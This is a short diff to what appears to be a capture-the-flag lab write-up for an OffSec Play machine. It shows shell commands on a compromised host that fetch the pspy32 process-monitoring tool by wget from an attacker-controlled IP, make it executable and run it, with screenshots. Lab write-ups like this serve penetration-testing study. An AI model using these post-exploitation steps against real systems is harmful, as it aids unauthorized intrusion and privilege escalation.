@@ -259,3 +259,11 @@ PSPY
 ```shell
 296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /usr/bin/wget http://192.168.45.198/pspy32
 ```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/b2d3d796-98c4-42c5-9276-ad9de43202e5)
+```shell
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ /usr/bin/chmod +x pspy32
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./pspy32
+```
+
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/4e78c408-f6ad-461e-ad01-e0f79f735a84)
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/dd799e2f-6015-49ef-a313-e802b25acd35)
